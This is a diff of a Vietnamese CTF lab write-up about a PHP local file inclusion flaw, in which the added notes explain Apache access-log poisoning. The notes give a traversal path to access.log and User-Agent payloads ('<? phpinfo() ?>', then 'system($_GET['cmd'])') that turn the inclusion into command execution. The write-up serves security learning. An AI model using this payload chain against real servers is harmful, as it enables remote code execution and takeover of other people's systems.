@@ -92,9 +92,37 @@ CBJS{LFI+FileUpload=Bomb}
 
 <img width="959" height="320" alt="image" src="https://github.com/user-attachments/assets/e99a7afc-6963-42ed-b3b3-a8c3df42e91f" />
 
-<img width="959" height="218" alt="image" src="https://github.com/user-attachments/assets/3cdf1d8e-29b5-473f-bb1c-213916d39564" />
+<img width="959" height="371" alt="image" src="https://github.com/user-attachments/assets/e20a8f07-0dac-4368-a6a8-a67ec50fbe62" />
 
-<img width="453" height="111" alt="image" src="https://github.com/user-attachments/assets/3c1028e4-17b4-4f5c-a651-f3b287232f20" />
+```
+10.10.0.250
+[14/Sep/2026:02:06:44 +0000]
+"GET /static/img/background_game.jpg HTTP/1.1"
+200
+38136 "https://pathtraversal.cyberjutsu-lab.tech:8095/?game=fatty-bird-1.html" --> referer 
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36" --> user-agent header
+```
+--> 1 dòng log như vậy thì mình kiểm soát được bnhieu phần, phần nào ?
+Dòng 3: có thể ksoat
+Dòng 6: vì đến từ referer header của http request 
+Dòng 7: dc
+--> Request line, referer header, user-agent header
+
+<img width="416" height="398" alt="image" src="https://github.com/user-attachments/assets/406027fd-38d8-4a19-8fb6-27e2e8d4ecc0" />
+
+- Dòng 3 có untrusted data là biến `$_GET['game']`
+- Dòng 21 biến`$game` được cộng chuỗi với một đường dẫn và đi vào hàm `include`
+
+- `include` sau khi copy ndung file, sẽ thực thi luôn code php trong đó
+--> Cần đưa untrusted data rơi vào trong nội dung của một file có sẵn trên server và ở những điểm có thể inject
+- Giá trị mặc định của `${APACHE_LOG_DIR}` là `/var/log/apache2/`
+../../../../var/log/apache2/access.log
+  <img width="805" height="361" alt="image" src="https://github.com/user-attachments/assets/94dfb897-ff16-4dcf-af77-a659e534780f" />
+
+Gửi  GET request có User-Agent là `<? phpinfo() ?>`
+<img width="959" height="467" alt="image" src="https://github.com/user-attachments/assets/fb9f21a6-1545-4ad6-9082-5d0757014cc5" />
+- Sau đó, thay `phpinfo()` thành ` system($_GET['cmd'])` và truyền câu lệnh muốn thực thi vào tham số `cmd`
+<img width="861" height="316" alt="image" src="https://github.com/user-attachments/assets/a29c38e0-b8b5-445e-a9af-5738b24df952" />
 
 # 2. NOTE
 
@@ -116,4 +144,9 @@ CBJS{LFI+FileUpload=Bomb}
 <img width="296" height="150" alt="image" src="https://github.com/user-attachments/assets/3e9d4ab6-15d6-4172-90ac-83523cee31e4" />
 
 - `readfile($file_path);` là hàm có độ nguy hiểm cao vì nó cho phép đọc toàn bộ nội dung file của tham số đường dẫn được đưa vào
-- 
+
+
+- Untrusted data
+
+<img width="362" height="162" alt="image" src="https://github.com/user-attachments/assets/2fff7019-5406-4334-8d75-188677780b32" />
+
